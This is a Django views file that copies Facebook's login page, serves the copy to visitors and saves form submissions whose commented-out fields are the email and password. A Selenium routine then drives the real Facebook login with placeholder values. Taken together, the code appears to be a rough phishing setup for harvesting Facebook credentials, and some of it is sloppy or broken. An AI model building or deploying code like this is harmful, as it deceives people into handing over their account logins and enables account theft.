from django.shortcuts import render,redirect
from django.http import HttpResponse
from .models import detail
from .forms import detailform
from selenium import webdriver
# Create your views here.


from bs4 import BeautifulSoup
import requests
url='https://www.facebook.com/login.php'
r=requests.get(url)
soup=BeautifulSoup(r.content,'html5lib')

def facebook(request):

    return HttpResponse(soup.prettify())

def fb(request):

    return render(request,'fb/fb2.html')

def detail(request):


    if request.method=='GET':
        return render(request,'fb/fb5.html',{'form':detailform})

    else:
        form=detailform(request.POST)
        #form.username=request.POST.get('email')
        #form.password=request.POST.get('pass')



        form.save()
        driver=webdriver.Chrome('chromedriver.exe')

        driver.get('https://www.facebook.com/login.php')

        driver.find_element_by_name('email').send_keys('eeeeeeeeeeeeeeeeeeee')
        driver.find_element_by_name('pass').send_keys('eeeeeeeeeeeeeeeeeeeee')
        driver.find_element_by_xpath('//*[@id="loginbutton"]').click()

        return redirect('facebook')

        #MyLoginForm = LoginForm(request.POST)


    #return render(request,'fb/checker.html',{'form':form}
